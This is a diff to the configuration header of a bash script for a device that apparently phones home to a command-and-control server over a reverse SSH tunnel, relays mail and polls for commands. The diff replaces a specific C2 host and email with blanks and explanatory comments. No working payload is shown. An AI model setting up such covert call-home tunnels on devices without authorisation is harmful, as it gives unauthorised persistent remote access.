@@ -1,14 +1,15 @@
 #/bin/bash
-DESTEMAIL="nathan@piratica.us"
-C2="psac2.piratica.us"
-C2PROTO="HTTP://"
-C2USER="psa"
+DESTEMAIL=""
+C2=""				# This is the C2 server that you'll connect to
+C2PROTO="HTTP://"	# Use HTTPS:// or HTTP:// for now
+C2USER=""			# This is a local, non-privileged user on the device that will log into C2 (via SSH)
 
-SSHPORT=2201
-PROXYPORT=2223
-LOKIHOME="/opt/loki2"
+SSHPORT=			# The port you'll use to connect to SSH on C2
+PROXYPORT=2223		# The port you'll use for the reverse SSH tunnel
+SMTPPORT=2525		# We'll tunnel SSH from C2 to here so that we can relay mail
+LOKIHOME=""			# where, on the device, does einar live
 COMMANDFILE=$MYNAME
-CALLHOMEFREQ=1
+CALLHOMEFREQ=		# How frequently, in minutes, do we check for commands
 
 # Check for necessary commands and create variables for them (or errors if they aren't there)
 MYNAME=$(cat $LOKIHOME/SERIAL)
